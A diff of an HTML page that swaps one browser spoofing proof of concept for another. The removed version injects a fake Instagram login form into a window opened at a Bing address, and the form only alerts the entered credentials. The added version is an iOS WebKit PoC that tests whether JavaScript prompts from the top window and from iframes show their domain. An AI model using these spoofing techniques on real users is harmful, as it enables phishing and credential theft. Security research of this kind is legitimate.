@@ -1,115 +1,46 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open Apps and APIs</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-        }
-        button {
-            margin: 10px;
-            padding: 10px 20px;
-            font-size: 14px;
-            cursor: pointer;
-        }
-    </style>
-    <script>
-        function go() {
-            var x = window.open('https://www.bing.com/csi');
-            setTimeout(function() {
-                x.document.body.innerHTML = `
-                    <h1>Login Fake Instagram </h1>
-                    Email: <input id="email"><br>
-                    Pass: <input id="pass" type="password"><br>
-                    <button onclick="alert('Email: ' + document.getElementById('email').value + '\\nPass: ' + document.getElementById('pass').value)">Login</button>
-                    <br><br>
-                    <button onclick="downloadFile()">Download Text File</button>
-                    <br><br>
-                    <h2>Open Apps & APIs</h2>
-                    <button onclick="openApp('tel://123456789')">Open Phone App</button>
-                    <button onclick="openApp('maps://')">Open Maps App</button>
-                    <button onclick="openApp('mailto:test@example.com')">Open Email App</button>
-                    <button onclick="openApp('camera://')">Open Camera App</button>
-                    <button onclick="openApp('whatsapp://')">Open WhatsApp</button>
-                    <button onclick="openApp('fb://')">Open Facebook</button>
-                    <button onclick="openApp('instagram://')">Open Instagram</button>
-                    <button onclick="openApp('twitter://')">Open Twitter</button>
-                    <button onclick="openApp('calculator://')">Open Calculator</button>
-                    <button onclick="openApp('spotify://')">Open Spotify</button>
-                    <button onclick="openApp('youtube://')">Open YouTube</button>
-                    <br><br>
-                    <button onclick="requestNotificationPermission()">Request Notification Permission</button>
-                    <button onclick="getLocation()">Get Location</button>
-                    <button onclick="openCamera()">Open Camera</button>
-                `;
-            }, 7000); // Allow time for the window to open
-        }
-
-        // Open apps using URI schemes
-        function openApp(uri) {
-            window.location.href = uri;
-        }
-
-        // Download file after user clicks
-        function downloadFile() {
-            const fileUrl = 'https://www.example.com/path/to/your/file.txt';
-            var link = document.createElement('a');
-            link.href = fileUrl;
-            link.download = 'file.txt';
-            link.click();
-        }
-
-        // Request permission for notifications
-        function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                alert('Notification permission already granted');
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        alert('Notification permission granted');
-                    } else {
-                        alert('Notification permission denied');
-                    }
-                });
-            } else {
-                alert('Notification permission denied');
-            }
-        }
-
-        // Get geolocation of the user
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    alert("Latitude: " + position.coords.latitude + "\nLongitude: " + position.coords.longitude);
-                }, error => {
-                    alert("Location access denied or error.");
-                });
-            } else {
-                alert("Geolocation is not supported by this browser.");
-            }
-        }
-
-        // Open camera using getUserMedia
-        function openCamera() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    document.body.appendChild(video);
-                })
-                .catch(err => {
-                    alert('Camera denied or not available');
-                });
-        }
-    </script>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>iOS JS Dialog PoC</title>
 </head>
 <body>
-    <h1>Welcome to App & API Demonstration</h1>
-    <button onclick="go()">Open App & API Demonstration</button>
+
+<h2>iOS JavaScript Dialog PoC (WebKit)</h2>
+
+<button onclick="topPrompt()">Top Window Prompt</button>
+<button onclick="iframePrompt()">Iframe Prompt</button>
+<button onclick="window0Prompt()">window[0] Prompt</button>
+
+<hr>
+
+<iframe id="xframe"
+  srcdoc="
+    <script>
+      function iframeFire() {
+        prompt('iframe: no domain shown');
+      }
+    </script>
+    <button onclick='iframeFire()'>Iframe Fire</button>
+  "
+  style="width:100%;height:120px;border:1px solid black;">
+</iframe>
+
+<script>
+function topPrompt() {
+  prompt('top window: no domain shown');
+}
+
+function iframePrompt() {
+  document.getElementById('xframe').contentWindow.prompt(
+    'iframe via parent: no domain shown'
+  );
+}
+
+function window0Prompt() {
+  window[0].prompt('window[0]: no domain shown');
+}
+</script>
+
 </body>
 </html>
